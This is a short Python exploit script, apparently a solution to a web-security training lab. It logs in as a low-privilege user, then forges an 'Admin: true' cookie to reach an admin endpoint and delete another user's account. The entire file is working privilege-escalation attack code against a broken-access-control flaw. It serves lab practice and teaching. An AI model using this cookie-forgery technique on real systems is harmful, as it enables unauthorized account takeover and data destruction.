import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)    
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find('input', {'name': 'csrf'})['value']  # Find an input element, with a name set to csrf, and then extract the value

    return csrf


def delete_user(s, url):
    
    # Get the csrf token from the login page
    login_url = url + '/login'
    csrf_token = get_csrf_token(s, login_url)
    
    # Use the csrf token to login as the user
    data = {
        'csrf': csrf_token,
        'username': 'wiener',
        'password': 'peter'
    }
    
    r = s.post(login_url, data=data, verify=False, proxies=proxies)
    res = r.text
    
    
    if 'Log out' in res:
        print('(+) Successfully logged in as the wiener user')
        
        # Retrieve the session cookie of the logged in user
        session_cookie = r.cookies.get_dict().get('Session')
        
        # Visit the admin panel and delete the user carlos
        delete_carlos_user_url = url + '/admin/delete?username=carlos'
        cookies = {'session': session_cookie, 'Admin': 'true'}
        
        r = requests.get(delete_carlos_user_url, cookies=cookies, verify=False, proxies=proxies)
        
        if r.status_code == 200:
            print('(+) Successfully deleted the Carlos user')
        else:
            print('(-) Failed to delete the Carlos user')
            sys.exit(-1)
    else:
        print('(-) Loggin failed')
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f'(+) Usage <url> {sys.argv[0]}')
        print(f'(+) Example: www.example.com {sys.argv[0]}')
        sys.exit(-1)
        
    s = requests.Session()
    url = sys.argv[1]
    
    delete_user(s, url)


if __name__ == '__main__':
    main()
    